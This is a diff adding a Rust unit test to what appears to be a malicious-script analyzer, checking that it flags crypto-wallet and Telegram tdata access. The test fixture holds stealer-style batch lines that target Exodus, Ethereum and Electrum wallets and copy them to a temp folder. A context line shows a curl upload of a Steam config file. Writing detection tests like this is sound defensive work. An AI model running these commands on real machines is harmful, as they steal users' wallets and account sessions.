@@ -5240,6 +5240,37 @@ curl --silent --output /dev/null -F steamusers=@"C:\Program Files (x86)\Steam\co
     }
 
     #[test]
+    fn wallet_and_telegram_paths_emit_credential_access_traits() {
+        let script = br#"set "walletPaths[Exodus]=AppData\Roaming\Exodus\exodus.wallet"
+set "walletPaths[Ethereum]=AppData\Roaming\Ethereum\keystore"
+set "tdataPath=C:\Users\puncher\AppData\Roaming\Telegram Desktop\tdata"
+xcopy /E /I "C:\Users\puncher\AppData\Roaming\Electrum\wallets\*" "%TEMP%\Wallet\Electrum\" >nul
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::CredentialAccess { technique, target }
+                    if technique == "crypto-wallet-path"
+                        && target.contains(r"Exodus\exodus.wallet")
+            )),
+            "crypto wallet path was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::CredentialAccess { technique, target }
+                    if technique == "telegram-tdata"
+                        && target.contains(r"Telegram Desktop\tdata")
+            )),
+            "Telegram tdata path was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn powershell_dotnet_clipboard_access_emits_input_capture_trait() {
         let script = br#"powershell -Command "[System.Windows.Forms.Clipboard]::GetText()"
 powershell -Command "[Windows.Forms.Clipboard]::SetText('copied')"
